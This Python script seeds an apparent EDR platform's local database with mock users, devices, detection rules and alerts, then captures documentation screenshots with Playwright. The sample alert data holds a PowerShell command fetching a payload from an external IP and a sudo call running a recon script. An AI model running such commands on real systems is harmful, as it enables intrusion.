#!/usr/bin/env python3
"""Captures screenshots for documentation by running a local Radegast server with mock data."""

import asyncio
import hashlib
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime, timedelta
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT_DIR = Path(__file__).resolve().parent.parent.parent
DOCS_DIR = ROOT_DIR / "docs"
SCREENSHOTS_DIR = DOCS_DIR / "_static" / "screenshots"


def get_free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]


def seed_database(db_path: Path):
    """Seed the SQLite database with rich mock data for documentation screenshots."""
    os.environ["RADEGAST_DATABASE_URL"] = f"sqlite+aiosqlite:///{db_path}"
    os.environ["RADEGAST_SECRET_KEY"] = "docs-screenshot-secret-key-32-chars-minimum"
    os.environ["RADEGAST_ENVIRONMENT"] = "dev"
    os.environ["RADEGAST_ENABLE_EMAIL_WORKER"] = "false"

    from app.database import Base, async_session, engine
    from app.models.api_key import APIKey
    from app.models.associations import device_group_devices, team_device_groups, team_users
    from app.models.device import Device
    from app.models.device_group import DeviceGroup
    from app.models.exclusion import Exclusion
    from app.models.log import Log, LogSeverity
    from app.models.pack import Pack
    from app.models.pack_version import PackVersion
    from app.models.pack_version_rule import PackVersionRule
    from app.models.public_key import PublicKey
    from app.models.team import Team
    from app.models.user import User, UserRole
    from app.services.auth import hash_password

    def hash_tok(tok: str) -> str:
        return hashlib.sha256(tok.encode()).hexdigest()

    async def _seed():
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.drop_all)
            await conn.run_sync(Base.metadata.create_all)

        async with async_session() as session:
            now = datetime.now(UTC)

            # Users
            admin_user = User(
                email="admin@radegast.local",
                password=hash_password("admin123456"),
                role=UserRole.admin,
                verified=True,
                extended_edr_enabled=True,
                api_keys_enabled=True,
                otp_enabled=False,
                onboarding_completed=True,
            )
            maintainer_user = User(
                email="maintainer@radegast.local",
                password=hash_password("password123"),
                role=UserRole.maintainer,
                verified=True,
                extended_edr_enabled=True,
                otp_enabled=True,
                otp_secret="JBSWY3DPEHPK3PXP",
                onboarding_completed=True,
            )
            analyst_user = User(
                email="analyst@radegast.local",
                password=hash_password("password123"),
                role=UserRole.user,
                verified=True,
                extended_edr_enabled=True,
                onboarding_completed=True,
            )
            devops_user = User(
                email="devops@radegast.local",
                password=hash_password("password123"),
                role=UserRole.user,
                verified=True,
                extended_edr_enabled=True,
                onboarding_completed=True,
            )
            session.add_all([admin_user, maintainer_user, analyst_user, devops_user])
            await session.flush()

            # Teams
            secops_team = Team(
                name="Security Operations",
                permission_pack="write",
                permission_invite="write",
                permission_admin="write",
                permission_logs="read",
            )
            infra_team = Team(
                name="Infrastructure & DevOps",
                permission_pack="write",
                permission_invite="write",
                permission_admin="write",
                permission_logs="read",
            )
            session.add_all([secops_team, infra_team])
            await session.flush()

            await session.execute(team_users.insert().values(team_id=secops_team.id, user_id=admin_user.id))
            await session.execute(team_users.insert().values(team_id=secops_team.id, user_id=analyst_user.id))
            await session.execute(team_users.insert().values(team_id=infra_team.id, user_id=admin_user.id))
            await session.execute(team_users.insert().values(team_id=infra_team.id, user_id=maintainer_user.id))
            await session.execute(team_users.insert().values(team_id=infra_team.id, user_id=devops_user.id))

            # Device Groups
            prod_group = DeviceGroup(
                name="Production Servers",
                response_enabled=True,
                response_min_severity="high",
            )
            dev_group = DeviceGroup(
                name="Workstations & Laptops",
                response_enabled=False,
            )
            session.add_all([prod_group, dev_group])
            await session.flush()

            await session.execute(team_device_groups.insert().values(team_id=secops_team.id, device_group_id=prod_group.id))
            await session.execute(team_device_groups.insert().values(team_id=secops_team.id, device_group_id=dev_group.id))
            await session.execute(team_device_groups.insert().values(team_id=infra_team.id, device_group_id=prod_group.id))

            # Exclusions
            excl1 = Exclusion(
                device_group_id=prod_group.id,
                name="Ignore Scheduled Backup Cron",
                description="Suppress alerts from periodic backup script",
                jsonata_query="process.executable = '/usr/bin/rsync'",
                exclusion_type="hard",
            )
            excl2 = Exclusion(
                device_group_id=prod_group.id,
                name="Allow Local Test Runner",
                description="Downgrade test runners to informational",
                jsonata_query="process.command_line ~> /pytest/",
                exclusion_type="soft",
            )
            session.add_all([excl1, excl2])

            # API Keys
            key1 = APIKey(
                user_id=admin_user.id,
                name="SIEM Telemetry Forwarder",
                key_hash=hash_tok("rg_sampleapikeykeyforsecurityanalytics"),
                prefix="rg_siem_telemet",
                scopes={"devices": ["read"], "logs": ["read"], "groups": ["read"]},
                expires_at=now + timedelta(days=180),
                last_used=now - timedelta(hours=3),
            )
            key2 = APIKey(
                user_id=admin_user.id,
                name="CI/CD Agent Provisioning",
                key_hash=hash_tok("rg_sampleapikeyforautomationdeployments"),
                prefix="rg_cicd_provisi",
                scopes={"devices": ["write"], "packs": ["read"]},
                expires_at=now + timedelta(days=90),
                last_used=now - timedelta(days=1),
            )
            session.add_all([key1, key2])

            # Devices
            devices = [
                Device(
                    name="srv-db-prod-01",
                    token="tok_1",
                    last_seen=now - timedelta(minutes=2),
                    healthy=True,
                    agent_version="python 0.6.0",
                    rustinel_version="0.3.0",
                    os="linux",
                    signature_public_key="sig_key_1",
                ),
                Device(
                    name="srv-web-prod-02",
                    token="tok_2",
                    last_seen=now - timedelta(minutes=5),
                    healthy=True,
                    agent_version="python 0.6.0",
                    rustinel_version="0.3.0",
                    os="linux",
                    signature_public_key="sig_key_2",
                ),
                Device(
                    name="srv-api-prod-03",
                    token="tok_3",
                    last_seen=now - timedelta(minutes=1),
                    healthy=True,
                    agent_version="python 0.5.2",
                    rustinel_version="0.3.0",
                    os="linux",
                    signature_public_key="sig_key_3",
                ),
                Device(
                    name="ws-win-104",
                    token="tok_4",
                    last_seen=now - timedelta(minutes=3),
                    healthy=True,
                    agent_version="python 0.6.0",
                    rustinel_version="0.2.1",
                    os="windows",
                    signature_public_key="sig_key_4",
                ),
                Device(
                    name="ws-win-105",
                    token="tok_5",
                    last_seen=now - timedelta(minutes=7),
                    healthy=False,
                    agent_version="python 0.5.2",
                    rustinel_version="0.2.1",
                    os="windows",
                    signature_public_key="sig_key_5",
                ),
            ]
            session.add_all(devices)
            await session.flush()

            for d in devices[:3]:
                await session.execute(
                    device_group_devices.insert().values(device_group_id=prod_group.id, device_id=d.id)
                )
            for d in devices[3:]:
                await session.execute(
                    device_group_devices.insert().values(device_group_id=dev_group.id, device_id=d.id)
                )

            # Packs & Rules
            pack1 = Pack(
                pack_id="core-monitoring",
                name="Core System Monitoring",
                description="Baseline detection rules for system and process telemetry.",
                creator_id=admin_user.id,
            )
            pack2 = Pack(
                pack_id="mitre-attack",
                name="MITRE ATT&CK Linux/Windows",
                description="Comprehensive threat detection covering common TTPs.",
                creator_id=admin_user.id,
            )
            session.add_all([pack1, pack2])
            await session.flush()

            pv1 = PackVersion(
                pack_id=pack1.id,
                version="1.0.0",
                zip_path="packs/core-monitoring/1.0.0.zip",
                release_notes="Initial release",
                meta={
                    "status": "stable",
                    "level": "essential",
                    "expected_false_positive_level": "low",
                    "os": "linux",
                    "description": "Baseline detection rules for system and process telemetry.",
                },
            )
            pv2 = PackVersion(
                pack_id=pack2.id,
                version="1.2.0",
                zip_path="packs/mitre-attack/1.2.0.zip",
                release_notes="Updated rules",
                meta={
                    "status": "stable",
                    "level": "essential",
                    "expected_false_positive_level": "low",
                    "os": "all",
                    "description": "Comprehensive threat detection covering common TTPs.",
                },
            )
            session.add_all([pv1, pv2])
            await session.flush()

            rule1 = PackVersionRule(
                pack_version_id=pv1.id,
                rule_type="sigma",
                rule_id="sigma-proc-01",
                rule_content="title: Suspicious PowerShell Download\nid: sigma-proc-01\nstatus: stable\nlevel: critical\ndescription: Detects PowerShell downloading payload from external IP address",
            )
            rule2 = PackVersionRule(
                pack_version_id=pv1.id,
                rule_type="sigma",
                rule_id="sigma-priv-02",
                rule_content="title: Privilege Escalation via Sudo\nid: sigma-priv-02\nstatus: stable\nlevel: high\ndescription: Detects privilege escalation attempt via sudo",
            )
            rule3 = PackVersionRule(
                pack_version_id=pv2.id,
                rule_type="sigma",
                rule_id="sigma-recon-03",
                rule_content="title: Local System Discovery\nid: sigma-recon-03\nstatus: stable\nlevel: medium\ndescription: Detects system discovery tools execution",
            )
            session.add_all([rule1, rule2, rule3])

            # Logs / Alerts
            logs = [
                Log(
                    device_id=devices[0].id,
                    time=now - timedelta(minutes=15),
                    severity=LogSeverity.critical,
                    rule_id="sigma-proc-01",
                    rule_type="sigma",
                    content="placeholder_encrypted_content",
                    alert_resolution=None,
                    signature="sig_1",
                ),
                Log(
                    device_id=devices[1].id,
                    time=now - timedelta(hours=2),
                    severity=LogSeverity.high,
                    rule_id="sigma-priv-02",
                    rule_type="sigma",
                    content="placeholder_encrypted_content",
                    alert_resolution="true_positive",
                    triage_note="Confirmed unauthorized script execution by contractor account.",
                    signature="sig_2",
                ),
                Log(
                    device_id=devices[2].id,
                    time=now - timedelta(hours=6),
                    severity=LogSeverity.medium,
                    rule_id="sigma-recon-03",
                    rule_type="sigma",
                    content="placeholder_encrypted_content",
                    alert_resolution="false_positive",
                    triage_note="Scheduled Ansible inventory scanner.",
                    signature="sig_3",
                ),
            ]
            session.add_all(logs)
            await session.commit()

    asyncio.run(_seed())


def capture():
    temp_dir = tempfile.mkdtemp(prefix="radegast_docs_")
    db_path = Path(temp_dir) / "test.db"
    releases_dir = Path(temp_dir) / "releases"

    # Populate releases directory with mock artifacts
    for ver, os_name, arch in [
        ("0.6.0", "linux", "amd64"),
        ("0.6.0", "linux", "arm64"),
        ("0.6.0", "windows", "amd64"),
        ("0.6.0", "mac", "arm64"),
        ("0.5.2", "linux", "amd64"),
        ("0.5.2", "windows", "amd64"),
    ]:
        target_dir = releases_dir / ver / os_name / arch
        target_dir.mkdir(parents=True, exist_ok=True)
        (target_dir / "rustinel.zip").write_bytes(b"dummy binary package for radegast documentation screenshots")

    port = get_free_port()
    base_url = f"http://127.0.0.1:{port}"

    print(f"[*] Seeding database at {db_path}...")
    seed_database(db_path)

    env = os.environ.copy()
    env.update(
        {
            "RADEGAST_DATABASE_URL": f"sqlite+aiosqlite:///{db_path}",
            "RADEGAST_SECRET_KEY": "docs-screenshot-secret-key-32-chars-minimum",
            "RADEGAST_ENVIRONMENT": "dev",
            "RADEGAST_ENABLE_EMAIL_WORKER": "false",
            "RADEGAST_RELEASES_DIR": str(releases_dir),
            "PYTHONPATH": str(ROOT_DIR),
        }
    )

    print(f"[*] Starting test server on {base_url}...")
    cmd = [
        sys.executable,
        "-m",
        "uvicorn",
        "app.main:app",
        "--host",
        "127.0.0.1",
        "--port",
        str(port),
        "--log-level",
        "warning",
    ]
    proc = subprocess.Popen(cmd, env=env, cwd=str(ROOT_DIR))

    try:
        # Wait for backend server ready
        for _ in range(50):
            try:
                with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                    break
            except (ConnectionRefusedError, OSError):
                time.sleep(0.1)
        else:
            raise RuntimeError("FastAPI test server failed to start")

        print("[*] Server ready! Launching Playwright browser...")
        SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                viewport={"width": 1366, "height": 820},
                device_scale_factor=2,
            )
            page = context.new_page()

            def dismiss_modals():
                page.evaluate("""() => {
                    document.querySelectorAll('.shepherd-element, .shepherd-modal-overlay-container, .modal-backdrop').forEach(el => el.remove());
                    document.body.classList.remove('modal-open');
                    document.body.style.removeProperty('overflow');
                    document.body.style.removeProperty('padding-right');
                }""")

            # 1. Login Page
            print("[*] Capturing login-page.png...")
            page.goto(f"{base_url}/ui/login")
            page.wait_for_selector('input[type="email"]')
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "login-page.png"))

            # 2. Register Page
            print("[*] Capturing register-page.png...")
            page.goto(f"{base_url}/ui/register")
            page.wait_for_selector('input[type="email"]')
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "register-page.png"))

            # 3. Reset Password Page
            print("[*] Capturing reset-password-page.png...")
            page.goto(f"{base_url}/ui/reset-password")
            page.wait_for_selector('input[type="email"]')
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "reset-password-page.png"))

            # Authenticate
            print("[*] Logging in as admin@radegast.local...")
            page.goto(f"{base_url}/ui/login")
            page.fill('input[type="email"]', "admin@radegast.local")
            page.fill('input[type="password"]', "admin123456")
            page.click('button[type="submit"]')
            page.wait_for_url("**/ui/**")
            time.sleep(1)

            # Handle setup key modal
            try:
                if page.locator('#layoutConfirmSaved').count() > 0:
                    page.check('#layoutConfirmSaved')
                    time.sleep(0.3)
                    page.click('button:has-text("I\'ve Saved It — Proceed to App")')
                    time.sleep(0.5)
            except Exception:
                pass

            # Handle onboarding tour
            try:
                if page.locator('button:has-text("No, thanks, I know how this works")').count() > 0:
                    page.locator('button:has-text("No, thanks, I know how this works")').first.click()
                    time.sleep(0.5)
            except Exception:
                pass

            dismiss_modals()

            # Encrypt logs with user's AGE public key
            try:
                encrypted_payloads = page.evaluate("""async () => {
                    if (!window.encrypt) {
                        if (!window.Go) {
                            const s = document.createElement('script');
                            s.src = '/agewasm/wasm_exec.js';
                            await new Promise((r) => { s.onload = r; document.head.appendChild(s); });
                        }
                        const go = new window.Go();
                        const wasmRes = await WebAssembly.instantiateStreaming(fetch('/agewasm/main.wasm'), go.importObject);
                        go.run(wasmRes.instance);
                        await new Promise((r) => setTimeout(r, 200));
                    }
                    const res = await fetch('/api/v1/user/keys');
                    const keys = await res.json();
                    if (!keys || keys.length === 0) return null;
                    const pub = keys[0].public_key;
                    
                    const t1 = JSON.stringify({
                        "@timestamp": new Date().toISOString(),
                        "ecs.version": "9.3.0",
                        "event.kind": "alert",
                        "event.category": ["process", "network"],
                        "event.action": "process_execution",
                        "event.severity": 100,
                        "rule.name": "Suspicious PowerShell Payload Download",
                        "rule.description": "Detects PowerShell downloading payload from external IP address",
                        "edr.rule.severity": "Critical",
                        "edr.rule.engine": "Sigma",
                        "process.executable": "/usr/bin/powershell",
                        "process.name": "pwsh",
                        "process.command_line": "pwsh -NoProfile -c Invoke-WebRequest -Uri http://198.51.100.42/payload.bin",
                        "process.pid": 5824,
                        "process.parent.executable": "/bin/bash",
                        "process.parent.name": "bash",
                        "process.parent.pid": 5801,
                        "user.name": "root",
                        "destination.ip": "198.51.100.42",
                        "destination.port": 443,
                        "network.direction": "egress"
                    });
                    
                    const t2 = JSON.stringify({
                        "@timestamp": new Date().toISOString(),
                        "ecs.version": "9.3.0",
                        "event.kind": "alert",
                        "event.category": ["process"],
                        "event.action": "process_execution",
                        "event.severity": 80,
                        "rule.name": "Suspicious Sudo Execution",
                        "rule.description": "Detects privilege escalation attempt via sudo",
                        "edr.rule.severity": "High",
                        "edr.rule.engine": "Sigma",
                        "process.executable": "/usr/bin/sudo",
                        "process.name": "sudo",
                        "process.command_line": "sudo -u root /tmp/recon_script.sh",
                        "process.pid": 14920,
                        "process.parent.executable": "/bin/bash",
                        "process.parent.name": "bash",
                        "process.parent.pid": 14801,
                        "user.name": "devops"
                    });
                    
                    const e1 = window.encrypt(pub, t1);
                    const e2 = window.encrypt(pub, t2);
                    return [e1.output || e1, e2.output || e2];
                }""")

                if encrypted_payloads and len(encrypted_payloads) == 2:
                    import sqlite3
                    conn = sqlite3.connect(str(db_path))
                    cur = conn.cursor()
                    cur.execute("UPDATE logs SET content = ? WHERE id in (1)", (encrypted_payloads[0],))
                    cur.execute("UPDATE logs SET content = ? WHERE id in (2, 3)", (encrypted_payloads[1],))
                    conn.commit()
                    conn.close()
            except Exception as e:
                print(f"[!] Warning updating log encryption: {e}")

            # 4. Platform Dashboard
            print("[*] Capturing platform-dashboard.png...")
            page.goto(f"{base_url}/ui/")
            page.wait_for_selector('text="Overview"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "platform-dashboard.png"))

            # 5. Teams List
            print("[*] Capturing teams-list.png...")
            page.goto(f"{base_url}/ui/teams")
            page.wait_for_selector('text="Teams"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "teams-list.png"))

            # 6. Team Detail
            print("[*] Capturing team-detail.png...")
            page.goto(f"{base_url}/ui/teams/1")
            page.wait_for_selector('text="Security Operations"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "team-detail.png"))

            # 7. Groups List
            print("[*] Capturing groups-list.png...")
            page.goto(f"{base_url}/ui/groups")
            page.wait_for_selector('text="Device Groups"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "groups-list.png"))

            # 8. Group Detail
            print("[*] Capturing group-detail.png...")
            page.goto(f"{base_url}/ui/groups/1")
            page.wait_for_selector('text="Production Servers"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "group-detail.png"))

            # 9. Devices List
            print("[*] Capturing devices-list.png...")
            page.goto(f"{base_url}/ui/devices")
            page.wait_for_selector('text="Devices"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "devices-list.png"))

            # 10. Device Detail
            print("[*] Capturing device-detail.png...")
            page.goto(f"{base_url}/ui/devices/1")
            page.wait_for_selector('text="srv-db-prod-01"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "device-detail.png"))

            # 11. Packs List
            print("[*] Capturing packs-list.png...")
            page.goto(f"{base_url}/ui/packs")
            page.wait_for_selector('h2:has-text("Packs")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "packs-list.png"))

            # 12. Pack Detail
            print("[*] Capturing pack-detail.png...")
            page.goto(f"{base_url}/ui/packs/1")
            page.wait_for_selector('#editName')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "pack-detail.png"))

            # 13. Alerts & Threat Triage
            print("[*] Capturing alerts-list.png...")
            page.goto(f"{base_url}/ui/alerts")
            page.wait_for_selector('.alerts-container', timeout=10000)
            time.sleep(1)
            dismiss_modals()
            if page.locator('.alerts-list .card').count() > 0:
                page.locator('.alerts-list .card').first.click()
                time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "alerts-list.png"))

            # 14. Hunt Mode
            print("[*] Capturing hunts-view.png...")
            page.goto(f"{base_url}/ui/hunt")
            page.wait_for_selector('h2:has-text("Hunt Mode")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "hunts-view.png"))

            # 15. Releases
            print("[*] Capturing releases-list.png...")
            page.goto(f"{base_url}/ui/releases")
            page.wait_for_selector('h2:has-text("Releases")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "releases-list.png"))

            # 16. API Keys
            print("[*] Capturing apikeys-view.png...")
            page.goto(f"{base_url}/ui/apikeys")
            page.wait_for_selector('h2:has-text("API Keys")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "apikeys-view.png"))

            # 17. User Settings
            print("[*] Capturing settings-view.png...")
            page.goto(f"{base_url}/ui/settings")
            page.wait_for_selector('h2:has-text("User Settings")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "settings-view.png"))

            # 18. Key Transfer
            print("[*] Capturing key-transfer.png...")
            page.goto(f"{base_url}/ui/keys/transfer")
            page.wait_for_selector('h2:has-text("Key Transfer")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "key-transfer.png"))

            # 19. Key Recovery
            print("[*] Capturing key-recovery.png...")
            page.goto(f"{base_url}/ui/keys/recovery")
            page.wait_for_selector('h2:has-text("Key Recovery")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "key-recovery.png"))

            # 20. Admin Panel - Users
            print("[*] Capturing admin-users.png...")
            page.goto(f"{base_url}/ui/admin")
            page.wait_for_selector('h2:has-text("Admin Panel")')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "admin-users.png"))

            # 21. Admin Panel - Devices
            print("[*] Capturing admin-devices.png...")
            page.locator('button.nav-link:has-text("Devices")').click()
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "admin-devices.png"))

            # 22. Admin Panel - Packs
            print("[*] Capturing admin-packs.png...")
            page.locator('button.nav-link:has-text("Packs")').click()
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "admin-packs.png"))

            # 23. Admin Panel - Stats
            print("[*] Capturing admin-stats.png...")
            page.locator('button.nav-link:has-text("Stats")').click()
            page.wait_for_selector('text="Device Stats"')
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "admin-stats.png"))

            # 24. Admin Panel - Broadcast
            print("[*] Capturing admin-broadcast.png...")
            page.locator('button.nav-link:has-text("Broadcast")').click()
            time.sleep(1)
            dismiss_modals()
            page.screenshot(path=str(SCREENSHOTS_DIR / "admin-broadcast.png"))

            browser.close()
            print("[+] All 24 screenshots captured successfully to docs/_static/screenshots/!")

    finally:
        if "proc" in locals() and proc:
            proc.terminate()
            proc.wait()
        shutil.rmtree(temp_dir, ignore_errors=True)


if __name__ == "__main__":
    capture()
